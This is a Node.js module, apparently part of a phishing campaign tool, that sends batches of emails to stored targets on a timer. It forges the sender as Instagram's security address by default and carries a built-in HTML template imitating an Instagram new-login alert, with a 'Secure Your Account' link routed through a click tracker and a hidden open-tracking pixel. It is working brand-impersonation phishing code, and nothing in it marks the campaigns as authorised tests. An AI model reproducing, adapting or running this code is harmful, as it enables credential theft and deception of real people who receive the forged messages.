const nodemailer = require('nodemailer');
const Campaign = require('../models/Campaign');
const Target = require('../models/Target');
const Template = require('../models/Template');
const { getAll } = require('../config/database');
require('dotenv').config();

class EmailSender {
    constructor() {
       
        this.transporter = nodemailer.createTransport({
            host: process.env.SMTP_HOST,
            port: process.env.SMTP_PORT,
            secure: false, 
            auth: {
                user: process.env.SMTP_USER,
                pass: process.env.SMTP_PASS
            },
            tls: {
                rejectUnauthorized: false 
            }
        });

      
        this.transporter.verify((error, success) => {
            if (error) {
                console.error('❌ Eroare conectare SMTP:', error);
            } else {
                console.log('✅ Server SMTP gata pentru trimitere email-uri');
            }
        });
    }

    async startWorker() {
        console.log('🚀 Email worker pornit...');
        
      
        setInterval(async () => {
            await this.processCampaigns();
        }, 60000); 

      
        await this.processCampaigns();
    }

  
    async processCampaigns() {
        try {
            
            const campaigns = await getAll(`
                SELECT c.*, t.name as template_name, t.subject, t.html_content, t.text_content
                FROM campaigns c
                LEFT JOIN templates t ON c.template_id = t.id
                WHERE c.status = 'active'
            `);

            for (const campaign of campaigns) {
                await this.processCampaign(campaign);
            }
        } catch (error) {
            console.error('Eroare procesare campanii:', error);
        }
    }

  
    async processCampaign(campaign) {
        try {
           
            const now = Date.now();
            const lastSent = campaign.last_sent_at ? new Date(campaign.last_sent_at).getTime() : 0;
            const frequency = (campaign.frequency || 30) * 60 * 1000; // Convert la milisecunde

            if (now - lastSent < frequency) {
                return; // Nu e timpul încă
            }

         
            const targets = await getAll(`
                SELECT * FROM targets 
                WHERE campaign_id = ? AND status = 'pending' AND sent_at IS NULL
                LIMIT 5
            `, [campaign.id]);

            if (targets.length === 0) {
                console.log(`📧 Campania "${campaign.name}" nu are ținte de procesat`);
                return;
            }

            console.log(`📧 Trimit ${targets.length} email-uri pentru campania "${campaign.name}"`);

          
            for (const target of targets) {
                await this.sendPhishingEmail(target, campaign);
                
           
                await new Promise(resolve => setTimeout(resolve, 2000));
            }

         
            await require('../config/database').runQuery(
                'UPDATE campaigns SET last_sent_at = CURRENT_TIMESTAMP WHERE id = ?',
                [campaign.id]
            );

        } catch (error) {
            console.error(`Eroare procesare campanie ${campaign.id}:`, error);
        }
    }

 
    async sendPhishingEmail(target, campaign) {
        try {
            const baseUrl = process.env.BASE_URL || 'http://localhost:3000';
            const trackingLink = `${baseUrl}/track/click/${target.tracking_id}`;
            const trackingPixel = `${baseUrl}/track/open/${target.tracking_id}`;

          
            let htmlContent = campaign.html_content || this.getDefaultInstagramTemplate();
            
          
            htmlContent = htmlContent.replace(/{{link}}/g, trackingLink);
            htmlContent = htmlContent.replace(/{{first_name}}/g, target.first_name || 'User');
            htmlContent = htmlContent.replace(/{{email}}/g, target.email);

           
            htmlContent += `<img src="${trackingPixel}" width="1" height="1" style="display:none;" alt="" />`;

          
            const mailOptions = {
                from: process.env.SMTP_FROM || '"Instagram" <security@instagram.com>',
                to: target.email,
                subject: campaign.subject || 'Security alert: new login to Instagram',
                html: htmlContent,
                text: 'We noticed a new login to your Instagram account. If this was you, you can safely ignore this email.'
            };

           
            const info = await this.transporter.sendMail(mailOptions);
            console.log(`✅ Email trimis către ${target.email} - ID: ${info.messageId}`);

           
            await require('../config/database').runQuery(
                'UPDATE targets SET status = "sent", sent_at = CURRENT_TIMESTAMP WHERE id = ?',
                [target.id]
            );

        } catch (error) {
            console.error(`❌ Eroare trimitere email către ${target.email}:`, error);
        }
    }

    getDefaultInstagramTemplate() {
        return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Instagram Security Alert</title>
</head>
<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #fafafa; padding: 40px 0;">
        <tr>
            <td align="center">
                <table width="600" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border: 1px solid #dbdbdb;">
                    <!-- Header -->
                    <tr>
                        <td align="center" style="padding: 40px 0;">
                            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 50px; margin: 0; background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">Instagram</h1>
                        </td>
                    </tr>
                    
                    <!-- Content -->
                    <tr>
                        <td style="padding: 0 50px 40px;">
                            <h2 style="color: #262626; font-size: 24px; margin-bottom: 20px;">New login to Instagram</h2>
                            
                            <p style="color: #262626; font-size: 16px; line-height: 24px; margin-bottom: 20px;">
                                We noticed a new login to your Instagram account from a device you don't usually use.
                            </p>
                            
                            <div style="background: #f8f8f8; padding: 20px; border-radius: 8px; margin: 20px 0;">
                                <p style="margin: 0 0 10px 0; color: #262626;"><strong>Device:</strong> Chrome on Windows</p>
                                <p style="margin: 0 0 10px 0; color: #262626;"><strong>Location:</strong> Romania</p>
                                <p style="margin: 0; color: #262626;"><strong>Time:</strong> ${new Date().toLocaleString()}</p>
                            </div>
                            
                            <p style="color: #262626; font-size: 16px; line-height: 24px; margin-bottom: 30px;">
                                If this was you, you can safely ignore this email. If you didn't log in, you should secure your account.
                            </p>
                            
                            <a href="{{link}}" style="display: inline-block; background: #0095f6; color: white; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-weight: 600;">
                                Secure Your Account
                            </a>
                        </td>
                    </tr>
                    
                    <!-- Footer -->
                    <tr>
                        <td style="padding: 30px 50px; border-top: 1px solid #dbdbdb;">
                            <p style="color: #8e8e8e; font-size: 12px; margin: 0; text-align: center;">
                                Instagram · Meta Platforms, Inc., 1 Hacker Way, Menlo Park, CA 94025<br>
                                This message was sent to {{email}}. Not your account? <a href="#" style="color: #0095f6;">Remove your email</a> from this account.
                            </p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
</body>
</html>`;
    }
}

module.exports = new EmailSender();